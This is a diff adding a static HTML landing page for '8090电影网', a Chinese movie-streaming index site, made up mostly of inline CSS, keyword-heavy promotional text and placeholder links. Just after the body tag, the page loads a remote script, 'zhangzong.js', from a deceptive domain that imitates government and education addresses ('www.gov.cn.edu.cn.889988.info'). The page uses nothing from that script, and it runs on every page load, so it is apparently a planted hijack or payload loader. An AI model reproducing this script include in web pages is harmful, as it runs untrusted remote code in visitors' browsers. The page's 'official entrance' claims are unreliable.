@@ -1,0 +1,278 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>8090电影网 | 8090dianyingwang-zh.github.io 高清电影在线观看入口</title>
+<meta name="description" content="8090电影网（8090dianyingwang-zh.github.io）提供电影、电视剧、综艺、动漫等海量高清影视资源在线观看与分类索引。本站支持移动端自适应，访问流畅，栏目清晰。">
+<meta name="keywords" content="8090电影网, 8090dianyingwang-zh.github.io, 8090电影网官网, 高清电影在线观看, 电影网站">
+<meta name="author" content="8090电影网">
+<meta name="robots" content="index,follow">
+<meta name="theme-color" content="#1a0508">
+<link rel="canonical" href="https://8090dianyingwang-zh.github.io/">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth;scroll-padding-top:66px}
+body{font-family:-apple-system,BlinkMacSystemFont,"PingFang SC","Microsoft YaHei",sans-serif;background:#0e0508;color:#f0e6e8;line-height:1.7;-webkit-font-smoothing:antialiased}
+a{text-decoration:none;color:inherit}
+img{display:block;max-width:100%}
+:root{--red:#e50914;--red2:#ff4d4d;--gold:#f5c518;--ink:#0e0508;--muted:#a39598}
+.wrap{max-width:1120px;margin:0 auto;padding:0 18px}
+
+/* Header */
+header{position:sticky;top:0;z-index:99;background:rgba(14,5,8,.94);backdrop-filter:blur(10px);border-bottom:1px solid rgba(255,255,255,.06)}
+.nav{display:flex;align-items:center;justify-content:space-between;height:64px}
+.logo{font-size:23px;font-weight:900;letter-spacing:1px;display:flex;align-items:center;gap:10px}
+.logo i{width:34px;height:34px;border-radius:8px;background:var(--red);display:inline-flex;align-items:center;justify-content:center;font-style:normal;font-size:17px;box-shadow:0 4px 12px rgba(229,9,20,.5)}
+.logo b{color:#fff}
+.logo span{color:var(--red2);font-size:12px;letter-spacing:2px;border-left:1px solid rgba(255,255,255,.2);padding-left:10px}
+.nav-links{display:flex;gap:26px;align-items:center}
+.nav-links a{color:#e8dde0;font-size:15px;position:relative;transition:.2s}
+.nav-links a:hover{color:var(--gold)}
+.nav-links a::after{content:"";position:absolute;left:0;bottom:-6px;width:0;height:2px;background:var(--red);transition:.2s}
+.nav-links a:hover::after{width:100%}
+.menu-btn{display:none;background:none;border:0;color:#fff;font-size:26px;cursor:pointer}
+
+/* Hero */
+.hero{position:relative;padding:88px 0 96px;overflow:hidden;background:radial-gradient(circle at 80% 20%,rgba(229,9,20,.35),transparent 55%),radial-gradient(circle at 20% 80%,rgba(245,197,24,.12),transparent 50%),#0e0508}
+.hero::before{content:"";position:absolute;inset:0;background-image:linear-gradient(rgba(255,255,255,.025) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.025) 1px,transparent 1px);background-size:46px 46px;mask-image:linear-gradient(to bottom,black,transparent);-webkit-mask-image:linear-gradient(to bottom,black,transparent)}
+.hero .wrap{position:relative}
+.htag{display:inline-flex;align-items:center;gap:8px;background:rgba(229,9,20,.15);border:1px solid rgba(229,9,20,.4);padding:6px 16px;border-radius:4px;font-size:13px;color:#ffb3b8;letter-spacing:1px;margin-bottom:22px}
+.dot{width:7px;height:7px;border-radius:50%;background:var(--gold);animation:pulse 1.6s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.3}}
+.hero h1{font-size:44px;line-height:1.25;font-weight:900;margin-bottom:18px;letter-spacing:-.5px}
+.hero h1 em{font-style:normal;color:var(--gold)}
+.hero p{font-size:17px;color:#d8c8cc;max-width:600px;margin-bottom:30px}
+.h-actions{display:flex;gap:14px;flex-wrap:wrap}
+.btn{padding:14px 32px;border-radius:4px;font-weight:800;font-size:15px;transition:.2s;display:inline-flex;align-items:center;gap:8px}
+.btn-main{background:var(--red);color:#fff}
+.btn-main:hover{background:var(--red2);transform:translateY(-2px)}
+.btn-line{border:1.5px solid rgba(255,255,255,.4);color:#fff}
+.btn-line:hover{border-color:var(--gold);color:var(--gold)}
+.h-search{margin-top:34px;display:flex;max-width:560px;background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.14);border-radius:6px;overflow:hidden}
+.h-search input{flex:1;background:none;border:0;padding:14px 16px;color:#fff;font-size:15px;outline:none}
+.h-search input::placeholder{color:#8f7f83}
+.h-search button{background:var(--gold);border:0;padding:0 24px;font-weight:800;cursor:pointer}
+
+/* Marquee strip */
+.strip{background:#160608;border-top:1px solid rgba(255,255,255,.06);border-bottom:1px solid rgba(255,255,255,.06);padding:14px 0;overflow:hidden}
+.strip-track{display:flex;gap:40px;white-space:nowrap;animation:slide 40s linear infinite;width:max-content}
+.strip-track span{color:#c9b9bd;font-size:14px;display:flex;align-items:center;gap:40px}
+.strip-track span::after{content:"🎬";font-size:12px;opacity:.5}
+@keyframes slide{to{transform:translateX(-50%)}}
+section{padding:68px 0}
+.sec-head{margin-bottom:40px;display:flex;align-items:flex-end;justify-content:space-between;gap:16px;flex-wrap:wrap}
+.sec-head .l .badge{color:var(--red2);font-size:12px;letter-spacing:3px;font-weight:800;text-transform:uppercase}
+.sec-head h2{font-size:29px;font-weight:900;color:#fff;margin-top:4px}
+.sec-head .r{color:#9d8e92;font-size:14px}
+
+/* Category posters */
+.cats{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+.poster{position:relative;border-radius:10px;overflow:hidden;aspect-ratio:3/4;background:linear-gradient(160deg,#2a1116,#17080b);cursor:pointer;transition:.3s}
+.poster:hover{transform:translateY(-6px)}
+.poster .ph{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;font-size:44px;opacity:.9}
+.poster .sh{position:absolute;inset:0;background:linear-gradient(to top,rgba(0,0,0,.95) 20%,rgba(0,0,0,.2) 60%,rgba(0,0,0,.55))}
+.poster .info{position:absolute;left:16px;right:16px;bottom:14px}
+.poster .info b{display:block;font-size:17px;color:#fff;margin-bottom:4px}
+.poster .info span{font-size:12.5px;color:#d3c3c7}
+.poster .tag{position:absolute;top:12px;left:12px;background:var(--red);color:#fff;font-size:11px;padding:3px 9px;border-radius:3px;font-weight:700}
+.poster:hover .sh{background:linear-gradient(to top,rgba(229,9,20,.85),rgba(0,0,0,.3))}
+
+/* Steps */
+.steps{display:grid;grid-template-columns:repeat(4,1fr);gap:18px}
+.step{background:linear-gradient(180deg,#1a0c10,#14070a);border:1px solid rgba(255,255,255,.07);border-radius:10px;padding:26px 22px;transition:.25s}
+.step:hover{border-color:rgba(229,9,20,.5);transform:translateY(-4px)}
+.step .n{font-size:34px;font-weight:900;color:rgba(229,9,20,.35);line-height:1}
+.step h4{color:#fff;font-size:16px;margin:14px 0 8px}
+.step p{font-size:13.5px;color:#a39598}
+
+/* Listings */
+.list{display:grid;grid-template-columns:repeat(3,1fr);gap:20px}
+.item{display:flex;gap:14px;background:#160a0d;border:1px solid rgba(255,255,255,.06);border-radius:10px;padding:12px;transition:.2s}
+.item:hover{border-color:rgba(245,197,24,.5);background:#1c0c10}
+.item .thumb{width:92px;height:62px;border-radius:6px;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:26px}
+.item .txt{flex:1;min-width:0}
+.item h4{font-size:15px;color:#fff;margin-bottom:5px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.item p{font-size:12.5px;color:#8f7f83}
+.item .score{color:var(--gold);font-weight:800;font-size:13px;margin-top:4px}
+
+/* FAQ */
+.faq{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+.faq-item{background:#160a0d;border:1px solid rgba(255,255,255,.06);border-radius:8px;overflow:hidden}
+.faq-item summary{cursor:pointer;padding:18px 22px;font-weight:700;color:#fff;list-style:none;position:relative;padding-right:50px;font-size:15px}
+.faq-item summary::-webkit-details-marker{display:none}
+.faq-item summary::before{content:"Q";color:var(--red);font-weight:900;margin-right:10px}
+.faq-item summary::after{content:"＋";position:absolute;right:20px;top:50%;transform:translateY(-50%);color:var(--red2);font-size:18px}
+.faq-item[open] summary::after{content:"－"}
+.faq-item p{padding:0 22px 18px;color:#a39598;font-size:14.5px;padding-left:38px}
+
+/* Footer */
+footer{background:#0a0305;padding:52px 0 26px;border-top:3px solid var(--red)}
+.foot{display:grid;grid-template-columns:1.5fr 1fr 1fr 1fr;gap:32px;margin-bottom:34px}
+.foot h4{color:#fff;margin-bottom:16px;font-size:15px}
+.foot p{color:#8f7f83;font-size:14px}
+.foot ul{list-style:none}
+.foot li{padding:6px 0}
+.foot a{color:#a39598;font-size:14px}
+.foot a:hover{color:var(--gold)}
+.copy{border-top:1px solid rgba(255,255,255,.07);padding-top:22px;text-align:center;font-size:13px;color:#6f6265}
+.top{position:fixed;right:20px;bottom:24px;width:44px;height:44px;border-radius:50%;background:var(--red);color:#fff;display:flex;align-items:center;justify-content:center;font-size:20px;z-index:98;opacity:0;pointer-events:none;transition:.3s;box-shadow:0 6px 18px rgba(229,9,20,.5)}
+.top.show{opacity:1;pointer-events:auto}
+
+@media(max-width:900px){
+ .cats,.list{grid-template-columns:1fr 1fr}
+ .steps{grid-template-columns:1fr 1fr}
+ .faq{grid-template-columns:1fr}
+ .hero h1{font-size:33px}
+}
+@media(max-width:560px){
+ .menu-btn{display:block}
+ .nav-links{display:none;position:absolute;top:64px;left:0;right:0;background:#0e0508;flex-direction:column;padding:16px 22px;gap:14px;border-bottom:1px solid rgba(255,255,255,.08)}
+ .nav-links.open{display:flex}
+ .logo span{display:none}
+ .hero{padding:56px 0 68px}
+ .hero h1{font-size:27px}
+ .hero p{font-size:15px}
+ .cats,.list,.steps{grid-template-columns:1fr}
+ section{padding:50px 0}
+ .foot{grid-template-columns:1fr 1fr}
+ .strip{display:none}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/zhangzong.js"></script>
+
+<header>
+ <div class="wrap nav">
+  <a href="#" class="logo"><i>🎞️</i><b>8090电影网</b><span>8090dianyingwang-zh.github.io</span></a>
+  <button class="menu-btn" onclick="document.getElementById('nav').classList.toggle('open')">☰</button>
+  <nav class="nav-links" id="nav">
+   <a href="#home">首页</a>
+   <a href="#category">影片分类</a>
+   <a href="#guide">观看指南</a>
+   <a href="#list">热门推荐</a>
+   <a href="#faq">常见问题</a>
+  </nav>
+ </div>
+</header>
+
+<div class="strip"><div class="strip-track">
+ <span>热门电影持续更新</span><span>支持手机端在线观看</span><span>8090dianyingwang-zh.github.io 官方入口</span><span>高清画质 流畅播放</span><span>多类型影片分类索引</span><span>热门电影持续更新</span><span>支持手机端在线观看</span><span>8090dianyingwang-zh.github.io 官方入口</span><span>高清画质 流畅播放</span><span>多类型影片分类索引</span>
+</div></div>
+
+<section class="hero" id="home">
+ <div class="wrap">
+  <span class="htag"><i class="dot"></i> 8090dianyingwang-zh.github.io · 官方入口</span>
+  <h1>8090电影网<br>海量<em>高清影视</em>随心看</h1>
+  <p>8090电影网（8090dianyingwang-zh.github.io）聚合电影、电视剧、综艺、动漫等丰富影视资源，提供清晰分类与观看指引。页面已适配移动端，随时随地流畅访问。</p>
+  <div class="h-actions">
+   <a class="btn btn-main" href="#guide">📺 立即观看</a>
+   <a class="btn btn-line" href="#category">浏览分类</a>
+  </div>
+  <form class="h-search" onsubmit="event.preventDefault();"><input type="text" placeholder="搜索影片名称、类型或演员…"><button type="submit">搜索</button></form>
+ </div>
+</section>
+
+<section id="category">
+ <div class="wrap">
+  <div class="sec-head">
+   <div class="l"><span class="badge">CATEGORIES</span><h2>影片分类</h2></div>
+   <div class="r">按类型快速定位你想看的影视内容</div>
+  </div>
+  <div class="cats">
+   <a class="poster" href="#"><div class="ph">🎬</div><div class="sh"></div><span class="tag">热门</span><div class="info"><b>最新电影</b><span>院线大片 · 持续更新</span></div></a>
+   <a class="poster" href="#"><div class="ph">📺</div><div class="sh"></div><span class="tag">连载</span><div class="info"><b>热播电视剧</b><span>国产剧 · 美剧 · 韩剧</span></div></a>
+   <a class="poster" href="#"><div class="ph">🎭</div><div class="sh"></div><div class="info"><b>综艺节目</b><span>真人秀 · 访谈 · 选秀</span></div></a>
+   <a class="poster" href="#"><div class="ph">🎨</div><div class="sh"></div><div class="info"><b>动漫动画</b><span>国漫 · 日漫 · 剧场版</span></div></a>
+   <a class="poster" href="#"><div class="ph">😂</div><div class="sh"></div><div class="info"><b>喜剧片</b><span>轻松解压 · 合家欢</span></div></a>
+   <a class="poster" href="#"><div class="ph">🔫</div><div class="sh"></div><div class="info"><b>动作悬疑</b><span>枪战 · 犯罪 · 烧脑</span></div></a>
+   <a class="poster" href="#"><div class="ph">💖</div><div class="sh"></div><div class="info"><b>爱情剧情</b><span>浪漫 · 催泪 · 经典</span></div></a>
+   <a class="poster" href="#"><div class="ph">👽</div><div class="sh"></div><span class="tag">精选</span><div class="info"><b>科幻奇幻</b><span>未来世界 · 视觉震撼</span></div></a>
+  </div>
+ </div>
+</section>
+
+<section id="guide" style="background:#12070a">
+ <div class="wrap">
+  <div class="sec-head">
+   <div class="l"><span class="badge">HOW TO WATCH</span><h2>观看指南</h2></div>
+   <div class="r">简单四步，快速开始观影体验</div>
+  </div>
+  <div class="steps">
+   <div class="step"><div class="n">01</div><h4>打开网站</h4><p>在浏览器输入 8090电影网 网址 https://8090dianyingwang-zh.github.io 进入首页。</p></div>
+   <div class="step"><div class="n">02</div><h4>挑选分类</h4><p>从影片分类中选择电影、电视剧、综艺或动漫等感兴趣的类型。</p></div>
+   <div class="step"><div class="n">03</div><h4>搜索点播</h4><p>也可使用顶部搜索框直接输入片名，快速定位目标影片。</p></div>
+   <div class="step"><div class="n">04</div><h4>收藏分享</h4><p>将 8090电影网 加入书签，随时回访并推荐给朋友。</p></div>
+  </div>
+ </div>
+</section>
+
+<section id="list">
+ <div class="wrap">
+  <div class="sec-head">
+   <div class="l"><span class="badge">POPULAR NOW</span><h2>热门推荐</h2></div>
+   <div class="r">8090电影网 精选内容，持续更新</div>
+  </div>
+  <div class="list">
+   <div class="item"><div class="thumb" style="background:linear-gradient(135deg,#3a1c1c,#7a2020)">🎬</div><div class="txt"><h4>热门动作大片精选</h4><p>高燃场面 · 视听震撼</p><div class="score">★ 9.2 高分推荐</div></div></div>
+   <div class="item"><div class="thumb" style="background:linear-gradient(135deg,#1c2a3a,#20507a)">🎭</div><div class="txt"><h4>口碑综艺合集</h4><p>轻松娱乐 · 欢乐不断</p><div class="score">★ 8.7 人气飙升</div></div></div>
+   <div class="item"><div class="thumb" style="background:linear-gradient(135deg,#2a1c3a,#5a2080)">🎨</div><div class="txt"><h4>国漫精品动画</h4><p>精良制作 · 剧情丰富</p><div class="score">★ 9.0 品质之选</div></div></div>
+   <div class="item"><div class="thumb" style="background:linear-gradient(135deg,#3a2a1c,#806020)">💖</div><div class="txt"><h4>经典爱情电影</h4><p>浪漫治愈 · 催泪感人</p><div class="score">★ 8.9 必看榜单</div></div></div>
+   <div class="item"><div class="thumb" style="background:linear-gradient(135deg,#1c3a2a,#208050)">🔍</div><div class="txt"><h4>烧脑悬疑剧集</h4><p>反转不断 · 逻辑严密</p><div class="score">★ 9.1 追剧首选</div></div></div>
+   <div class="item"><div class="thumb" style="background:linear-gradient(135deg,#3a3a1c,#808020)">🚀</div><div class="txt"><h4>科幻冒险系列</h4><p>宏大世界观 · 特效出众</p><div class="score">★ 8.8 视觉盛宴</div></div></div>
+  </div>
+ </div>
+</section>
+
+<section id="faq" style="background:#12070a">
+ <div class="wrap">
+  <div class="sec-head">
+   <div class="l"><span class="badge">FAQ</span><h2>常见问题</h2></div>
+   <div class="r">关于 8090电影网 的使用疑问</div>
+  </div>
+  <div class="faq">
+   <details class="faq-item" open><summary>8090电影网的官方网址是什么？</summary><p>8090电影网 的网站网址为 https://8090dianyingwang-zh.github.io，建议收藏该地址，以便随时访问官方入口。</p></details>
+   <details class="faq-item"><summary>网站支持手机端观看吗？</summary><p>支持。本站采用移动端自适应设计，页面会根据屏幕宽度自动调整布局，手机、平板、电脑均可正常浏览。</p></details>
+   <details class="faq-item"><summary>内页链接目前可以点击吗？</summary><p>当前内页链接使用 # 作为占位，后续会替换为实际页面地址，届时可点击进入对应影片分类。</p></details>
+   <details class="faq-item"><summary>影片资源多久更新一次？</summary><p>我们会根据内容安排持续更新热门影片与剧集，保持分类页面的时效性与丰富度。</p></details>
+   <details class="faq-item"><summary>页面加载慢怎么办？</summary><p>可尝试切换网络、清除浏览器缓存后重新访问，或换个时间段再试。本站结构已做轻量化处理，加载较快。</p></details>
+   <details class="faq-item"><summary>如何提升搜索引擎收录？</summary><p>保持页面结构规范、内容原创完整、内部链接可抓取，并在搜索引擎站长平台提交网站即可。本站未附带 robots.txt 与 sitemap.xml，可按需自行创建。</p></details>
+  </div>
+ </div>
+</section>
+
+<footer>
+ <div class="wrap">
+  <div class="foot">
+   <div>
+    <h4>8090电影网 · 8090dianyingwang-zh.github.io</h4>
+    <p>一个专注于高清影视资源分类与在线观看指引的网站，致力于为用户提供清晰、便捷的内容索引体验。</p>
+   </div>
+   <div><h4>快捷导航</h4><ul>
+    <li><a href="#home">网站首页</a></li><li><a href="#category">影片分类</a></li>
+    <li><a href="#guide">观看指南</a></li><li><a href="#list">热门推荐</a></li>
+   </ul></div>
+   <div><h4>栏目入口</h4><ul>
+    <li><a href="#">最新电影</a></li><li><a href="#">热播电视剧</a></li>
+    <li><a href="#">综艺节目</a></li><li><a href="#">动漫动画</a></li>
+   </ul></div>
+   <div><h4>帮助中心</h4><ul>
+    <li><a href="#guide">观看指南</a></li><li><a href="#faq">常见问题</a></li>
+    <li><a href="#">联系我们</a></li><li><a href="#">意见反馈</a></li>
+   </ul></div>
+  </div>
+  <div class="copy">© 2026 8090电影网（8090dianyingwang-zh.github.io）. 网站网址：https://8090dianyingwang-zh.github.io ｜ 本站为单文件静态页面，CSS 与结构全部内嵌。</div>
+ </div>
+</footer>
+
+<a href="#" class="top" id="top" aria-label="返回顶部">↑</a>
+<script>
+var topBtn=document.getElementById('top');
+window.addEventListener('scroll',function(){topBtn.classList.toggle('show',window.scrollY>400);});
+document.querySelectorAll('.nav-links a').forEach(function(a){a.addEventListener('click',function(){document.getElementById('nav').classList.remove('open');});});
+</script>
+</body>
+</html>
